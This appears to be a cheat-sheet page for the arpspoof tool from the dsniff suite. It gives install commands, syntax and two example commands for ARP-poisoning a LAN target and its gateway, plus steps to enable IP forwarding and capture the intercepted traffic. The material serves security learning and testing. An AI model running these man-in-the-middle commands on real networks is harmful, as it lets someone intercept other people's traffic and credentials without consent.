arpspoof
Simple ARP spoofing utility

Sniffing & Spoofing
Description
arpspoof redirects packets from a target host on the LAN to another host by forging ARP replies. Part of dsniff suite.

Installation / Check
Check if installed:

which arpspoof
Install command:

sudo apt install dsniff
Basic Syntax
arpspoof -i <interface> -t <target> <gateway>
Common Commands
Command	What it does	When to use	Risk
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

Spoof target to gateway	MITM setup	
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

Spoof gateway to target	Complete MITM	
Step-by-Step Guide
1
Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
2
Run arpspoof to target
3
Run arpspoof to gateway (another terminal)
4
Use other tools to capture traffic
